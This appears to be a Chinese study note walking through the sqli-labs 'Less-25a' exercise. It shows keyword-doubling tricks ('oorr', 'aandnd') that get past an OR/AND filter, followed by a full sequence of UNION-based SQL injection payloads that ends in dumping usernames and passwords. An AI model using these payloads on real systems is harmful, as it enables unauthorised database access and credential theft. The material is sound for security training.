---
title: less25a
url: https://www.yuque.com/u29002979/ep2zrx/zy3amxnre03p9s6u
---

```bash
$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";

$id= preg_replace('/or/i',"", $id);			//strip out OR (non case sensitive)
$id= preg_replace('/AND/i',"", $id);		//Strip out AND (non case sensitive)
```

> 用or变成oorr 或 用||代替or
> 用and变成aandnd 或 用&&替代and
> 注：在url中&&还有传参的作用如果需要使用&&需要进行url编码

与Less25的区别是数字型注入

`1'`

> **Warning**: mysql\_fetch\_array() expects parameter 1 to be resource, boolean given in **E:\phpstudy\_pro\WWW\sql.com\Less-25a\index.php** on line **37**

```bash
测试字段数
1 oorrder by 4-- +没有第4列
1 oorrder by 3-- +返回正常，有3个字段。

检查回显点
-1 union select 1,2,3-- +
显示2，3是回显点

爆破数据库名称
-1 union select 1,2,(select database())-- +

爆破数据表
-1 union select 1,2,(select group_concat(table_name) from infoorrmation_schema.tables where table_schema=database())--+

爆破字段名称
-1 union select 1,2,(select group_concat(column_name) from infoorrmation_schema.columns where table_schema=database() aandnd table_name='users')--+

爆破字段内容
-1 union select 1,2,(select group_concat(username,0x7e,passwoorrd) from users)--+
```
